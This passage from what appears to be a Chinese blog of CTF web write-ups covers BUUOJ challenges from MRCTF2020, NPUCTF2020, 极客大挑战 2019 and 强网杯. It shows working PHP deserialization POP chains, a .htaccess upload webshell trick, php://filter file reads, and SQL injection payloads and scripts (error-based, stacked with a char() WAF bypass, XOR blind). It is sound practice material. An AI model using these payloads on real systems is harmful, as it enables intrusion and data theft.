</span>&#123;</span><br><span class="line">        <span class="keyword">const</span> &#123;status&#125; = data;</span><br><span class="line">        <span class="keyword">if</span>(status) &#123;</span><br><span class="line">            <span class="built_in">document</span>.location = <span class="string">&#x27;/login&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getflag</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    $.get(<span class="string">&#x27;/api/flag&#x27;</span>).done(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">const</span> &#123;flag&#125; = data;</span><br><span class="line">        $(<span class="string">&quot;#username&quot;</span>).val(flag);</span><br><span class="line">    &#125;).fail(<span class="function"><span class="keyword">function</span>(<span class="params">xhr, textStatus, errorThrown</span>) </span>&#123;</span><br><span class="line">        alert(xhr.responseJSON.message);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>提示配置的静态目录是程序的根目录，可能存在任意文件读取，直接访问<code>/app.js</code>，得到源码。</p>
<h4 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h4><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id[]=<span class="number">1</span>&amp;gg[]=<span class="number">2</span>&amp;passwd[]=<span class="number">1234567</span></span><br><span class="line">passwd=<span class="number">1234567</span>asdf</span><br></pre></td></tr></table></figure>

<p>md5 一个数组会返回 false，两个 false 相等。</p>
<p>利用弱类型，1234567asdf 转换为数字就是 1234567</p>
<h4 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h4><p>普通的文件上传，传文件时需要修改 content type</p>
<p>传一个 <code>.htaccess</code></p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute"><span class="nomarkup">SetHandler</span></span> application/x-httpd-php</span><br></pre></td></tr></table></figure>

<p>传一个 .jpg 格式的🐎就可以了。</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">c</span>=show_source(<span class="string">&#x27;/flag&#x27;</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure>

<h4 id="MRCTF2020-PYWebsite"><a href="#MRCTF2020-PYWebsite" class="headerlink" title="[MRCTF2020]PYWebsite"></a>[MRCTF2020]PYWebsite</h4><p>F12，直接看到 flag.php，进去改XFF，127.0.0.1.</p>
<h4 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="[MRCTF2020]Ezpop"></a>[MRCTF2020]Ezpop</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">Welcome to index.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  $var;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params">$value</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params">$key</span>)</span>&#123;</span><br><span class="line">        $function = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    @unserialize($_GET[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    $a=<span class="keyword">new</span> Show;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>反序列化，POP链构造。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  $var = <span class="string">&#x27;php://filter/convert.base64-encode/resource=flag.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params">$value</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($value);</span><br><span class="line">        <span class="comment">// -1   var = flag.php</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">        <span class="comment">// -4 str = Test</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p ;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params">$key</span>)</span>&#123;</span><br><span class="line">        $function = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> $function();</span><br><span class="line">        <span class="comment">// -2   p = Modifier</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$s1 = <span class="keyword">new</span> Show();</span><br><span class="line">$s2 = <span class="keyword">new</span> Show();</span><br><span class="line">$s1-&gt;source = $s2;</span><br><span class="line">$s2-&gt;str = <span class="keyword">new</span> Test();</span><br><span class="line">$s2-&gt;str-&gt;p = <span class="keyword">new</span> Modifier();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($s1));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>触发 Show 的 toString 方法，需要一个 Show 对象（s1）的 source 是另一个 Show 对象。调用顺序<code>$s1-&gt;__wakeup</code>，<code>$s1-&gt;source-&gt;__toString()</code></li>
<li>触发 Test 的 get 方法，可以把 s2 的 str 属性设置为一个 Test 对象，Show 的 toString 方法访问了 source 属性，而 Test 类不存在这个属性，可以触发。调用顺序<code>$s2-&gt;str-&gt;source</code>，<code>$s2-&gt;str-&gt;__get()</code>。</li>
<li>触发 Modifier 的 invoke 方法，在 Test 类中可以将 p 设置为 Modifier 的对象，可以触发。同时将 Modifier 的 var 变量设置为伪协议读取 flag.php。调用顺序<code>$s2-&gt;str-&gt;p()</code>，<code>$s2-&gt;str-&gt;p-&gt;__invoke()</code>。</li>
</ul>
<p>最后的 urlencode 是必须的</p>
<h4 id="NPUCTF2020-ReadlezPHP"><a href="#NPUCTF2020-ReadlezPHP" class="headerlink" title="[NPUCTF2020]ReadlezPHP"></a>[NPUCTF2020]ReadlezPHP</h4><p>反序列化</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $a;</span><br><span class="line">    <span class="keyword">public</span> $b;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b = <span class="string">&quot;phpinfo&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $a = <span class="keyword">$this</span>-&gt;a;</span><br><span class="line">        $b = <span class="keyword">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> $b($a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$s = <span class="keyword">new</span> HelloPhp();</span><br><span class="line"><span class="keyword">echo</span> serialize($s);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>phpinfo 可以接受参数，-1 表示显示所有信息，flag 在 phpinfo 中</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">time.php?data=O:<span class="number">8</span>:%<span class="number">22</span>HelloPhp%<span class="number">22</span>:<span class="number">2</span>:&#123;s:<span class="number">1</span>:%<span class="number">22</span>a%<span class="number">22</span>;i:<span class="number">-1</span>;s:<span class="number">1</span>:%<span class="number">22</span>b%<span class="number">22</span>;s:<span class="number">7</span>:%<span class="number">22</span>phpinfo%<span class="number">22</span>;&#125;</span><br></pre></td></tr></table></figure>

<h4 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h4><p>题目提示有备份，下载<a target="_blank" rel="noopener" href="http://www.zip./">www.zip。</a></p>
<p>根据<code>class.php</code>，我们需要传入一个Name对象，username是admin，password是100，同时还要绕过wakeup方法。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $username;</span><br><span class="line">    <span class="keyword">private</span> $password;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$username,$password</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = $username;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$f = <span class="keyword">new</span> Name(<span class="string">&#x27;admin&#x27;</span>,<span class="number">100</span>);</span><br><span class="line"><span class="keyword">echo</span> serialize($f);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>得到序列化后的字符串<code>O:4:&quot;Name&quot;:2:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125;</code>，其中username和password都是private的变量，Name前后各有一个空字符，所以长度为14。为了绕过wakeup，将<code>O:4:&quot;Name&quot;:2</code>后面的2改为3（当说明的变量数大于实际变量数可以绕过wakeup方法）。</p>
<p>由于含有空字符，使用python发送请求。</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="attribute">url</span> = &#x27;http://<span class="number">54603761</span>-<span class="number">44</span>c<span class="number">7</span>-<span class="number">4</span>fe<span class="number">6</span>-<span class="number">81</span>de-add<span class="number">413</span>bc<span class="number">8939</span>.node<span class="number">3</span>.buuoj.cn/&#x27;</span><br><span class="line"><span class="attribute">params</span> = &#123;&#x27;select&#x27;: &#x27;O:<span class="number">4</span>:<span class="string">&quot;Name&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">14</span>:<span class="string">&quot;\0Name\0username&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">14</span>:<span class="string">&quot;\0Name\0password&quot;</span>;i:<span class="number">100</span>;&#125;&#x27;&#125;</span><br><span class="line"><span class="attribute">r</span> = requests.get(url, params=params)</span><br><span class="line"><span class="attribute">print</span>(r.text)</span><br></pre></td></tr></table></figure>

<h4 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h4><p>源代码里看到<code>Secret.php</code>，根据提示改一下referer,xff和useragent</p>
<h4 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h4><p>用菜刀或者蚁剑连一下，flag在根目录</p>
<h4 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h4><p><code>admin&#39; or 1=1 #</code></p>
<h4 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h4><p>过滤了 ascii, substr, by, =, &gt;,  union, and, *。</p>
<p>报错注入，用 updatexml，用like代替=，<code>?username=admin%27or(updatexml(1,concat(0x7e,(select(password)from(H4rDsq1)),0x7e),1))%23&amp;password=123</code>，<code>?username=admin%27or(updatexml(1,concat(0x7e,(select(right(password,30))from(H4rDsq1)),0x7e),1))%23&amp;password=123</code>。</p>
<h4 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h4><p>查看源代码，发现一个<code>Archive_room.php</code>，点Secret，提示回去再看看。</p>
<p>抓包，发现<code>secr3t.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    $file=$_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(strstr($file,<span class="string">&quot;../&quot;</span>)||stristr($file, <span class="string">&quot;tp&quot;</span>)||stristr($file,<span class="string">&quot;input&quot;</span>)||stristr($file,<span class="string">&quot;data&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Oh no!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>($file); </span><br><span class="line"><span class="comment">//flag放在了flag.php里</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>file=flag.php，提示我就在这里但你看不到。file=php://filter/read=convert.base64-encode/resource=flag.php，base64解密，得到flag</p>
<h4 id="强网杯-随便注"><a href="#强网杯-随便注" class="headerlink" title="[强网杯] 随便注"></a>[强网杯] 随便注</h4><p>输入引号，报错</p>
<p><code>1&#39; or 1=1#</code>，查询出所有内容</p>
<p><code>0&#39; union select database()#</code>，得到waf：<code>return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</code></p>
<p>尝试堆叠注入，用char绕过waf</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;0&#x27;;set @s=concat(%s);PREPARE a FROM @s;EXECUTE a;&quot;</span></span><br><span class="line"><span class="keyword">exp</span> = <span class="string">&#x27;select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()&#x27;</span></span><br><span class="line"><span class="comment"># 查表名</span></span><br><span class="line"><span class="comment"># exp = &quot;select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME=&#x27;1919810931114514&#x27;&quot;</span></span><br><span class="line"><span class="comment"># 查列名</span></span><br><span class="line"><span class="comment"># exp = &quot;select flag from `1919810931114514`&quot;</span></span><br><span class="line"><span class="comment"># 查flag，表名要使用反引号</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i in <span class="keyword">exp</span>:</span><br><span class="line">	res += <span class="string">&quot;char(%s),&quot;</span>%(<span class="keyword">ord</span>(i))</span><br><span class="line">my_payload = payload%(res[:-<span class="number">1</span>])</span><br><span class="line"><span class="keyword">print</span> my_payload</span><br></pre></td></tr></table></figure>

<p>得到类似下面的结果</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&#x27;;<span class="keyword">set</span> @s=<span class="keyword">concat</span>(<span class="built_in">char</span>(<span class="number">115</span>),<span class="built_in">char</span>(<span class="number">101</span>),<span class="built_in">char</span>(<span class="number">108</span>),<span class="built_in">char</span>(<span class="number">101</span>),<span class="built_in">char</span>(<span class="number">99</span>),<span class="built_in">char</span>(<span class="number">116</span>),<span class="built_in">char</span>(<span class="number">32</span>),<span class="built_in">char</span>(<span class="number">103</span>),<span class="built_in">char</span>(<span class="number">114</span>),<span class="built_in">char</span>(<span class="number">111</span>),<span class="built_in">char</span>(<span class="number">117</span>),<span class="built_in">char</span>(<span class="number">112</span>),<span class="built_in">char</span>(<span class="number">95</span>),<span class="built_in">char</span>(<span class="number">99</span>),<span class="built_in">char</span>(<span class="number">111</span>),<span class="built_in">char</span>(<span class="number">110</span>),<span class="built_in">char</span>(<span class="number">99</span>),<span class="built_in">char</span>(<span class="number">97</span>),<span class="built_in">char</span>(<span class="number">116</span>),<span class="built_in">char</span>(<span class="number">40</span>),<span class="built_in">char</span>(<span class="number">84</span>),<span class="built_in">char</span>(<span class="number">65</span>),<span class="built_in">char</span>(<span class="number">66</span>),<span class="built_in">char</span>(<span class="number">76</span>),<span class="built_in">char</span>(<span class="number">69</span>),<span class="built_in">char</span>(<span class="number">95</span>),<span class="built_in">char</span>(<span class="number">78</span>),<span class="built_in">char</span>(<span class="number">65</span>),<span class="built_in">char</span>(<span class="number">77</span>),<span class="built_in">char</span>(<span class="number">69</span>),<span class="built_in">char</span>(<span class="number">41</span>),<span class="built_in">char</span>(<span class="number">32</span>),<span class="built_in">char</span>(<span class="number">102</span>),<span class="built_in">char</span>(<span class="number">114</span>),<span class="built_in">char</span>(<span class="number">111</span>),<span class="built_in">char</span>(<span class="number">109</span>),<span class="built_in">char</span>(<span class="number">32</span>),<span class="built_in">char</span>(<span class="number">105</span>),<span class="built_in">char</span>(<span class="number">110</span>),<span class="built_in">char</span>(<span class="number">102</span>),<span class="built_in">char</span>(<span class="number">111</span>),<span class="built_in">char</span>(<span class="number">114</span>),<span class="built_in">char</span>(<span class="number">109</span>),<span class="built_in">char</span>(<span class="number">97</span>),<span class="built_in">char</span>(<span class="number">116</span>),<span class="built_in">char</span>(<span class="number">105</span>),<span class="built_in">char</span>(<span class="number">111</span>),<span class="built_in">char</span>(<span class="number">110</span>),<span class="built_in">char</span>(<span class="number">95</span>),<span class="built_in">char</span>(<span class="number">115</span>),<span class="built_in">char</span>(<span class="number">99</span>),<span class="built_in">char</span>(<span class="number">104</span>),<span class="built_in">char</span>(<span class="number">101</span>),<span class="built_in">char</span>(<span class="number">109</span>),<span class="built_in">char</span>(<span class="number">97</span>),<span class="built_in">char</span>(<span class="number">46</span>),<span class="built_in">char</span>(<span class="number">84</span>),<span class="built_in">char</span>(<span class="number">65</span>),<span class="built_in">char</span>(<span class="number">66</span>),<span class="built_in">char</span>(<span class="number">76</span>),<span class="built_in">char</span>(<span class="number">69</span>),<span class="built_in">char</span>(<span class="number">83</span>),<span class="built_in">char</span>(<span class="number">32</span>),<span class="built_in">char</span>(<span class="number">119</span>),<span class="built_in">char</span>(<span class="number">104</span>),<span class="built_in">char</span>(<span class="number">101</span>),<span class="built_in">char</span>(<span class="number">114</span>),<span class="built_in">char</span>(<span class="number">101</span>),<span class="built_in">char</span>(<span class="number">32</span>),<span class="built_in">char</span>(<span class="number">84</span>),<span class="built_in">char</span>(<span class="number">65</span>),<span class="built_in">char</span>(<span class="number">66</span>),<span class="built_in">char</span>(<span class="number">76</span>),<span class="built_in">char</span>(<span class="number">69</span>),<span class="built_in">char</span>(<span class="number">95</span>),<span class="built_in">char</span>(<span class="number">83</span>),<span class="built_in">char</span>(<span class="number">67</span>),<span class="built_in">char</span>(<span class="number">72</span>),<span class="built_in">char</span>(<span class="number">69</span>),<span class="built_in">char</span>(<span class="number">77</span>),<span class="built_in">char</span>(<span class="number">65</span>),<span class="built_in">char</span>(<span class="number">61</span>),<span class="built_in">char</span>(<span class="number">100</span>),<span class="built_in">char</span>(<span class="number">97</span>),<span class="built_in">char</span>(<span class="number">116</span>),<span class="built_in">char</span>(<span class="number">97</span>),<span class="built_in">char</span>(<span class="number">98</span>),<span class="built_in">char</span>(<span class="number">97</span>),<span class="built_in">char</span>(<span class="number">115</span>),<span class="built_in">char</span>(<span class="number">101</span>),<span class="built_in">char</span>(<span class="number">40</span>),<span class="built_in">char</span>(<span class="number">41</span>));<span class="keyword">PREPARE</span> a <span class="keyword">FROM</span> @s;<span class="keyword">EXECUTE</span> a;</span><br></pre></td></tr></table></figure>

<p>也可以交换1919810931114514和words两个表的名字，这样正常查询就可以得到1919810931114514表里的内容</p>
<h4 id="极客大挑战-2019-FinalSQL"><a href="#极客大挑战-2019-FinalSQL" class="headerlink" title="[极客大挑战 2019]FinalSQL"></a>[极客大挑战 2019]FinalSQL</h4><p>注入点在点击按钮出现的 <code>search.php/id=1</code> 中，用异或符号进行盲注。</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = &quot;http://4e80936d-618a-4d1b-8913-910f41a86c5f.node3.buuoj.cn/search.php&quot;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">128</span>):</span><br><span class="line">        d =&quot;?id=1^(ascii(substr((select(group_concat(password))from(F1naI1y)),&#x27;&quot;+str(i)+&quot;&#x27;,1))=&#x27;&quot;+str(j)+&quot;&#x27;)^1&quot;</span><br><span class="line">        r = requests.<span class="keyword">get</span>(url+d)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Click&#x27;</span> <span 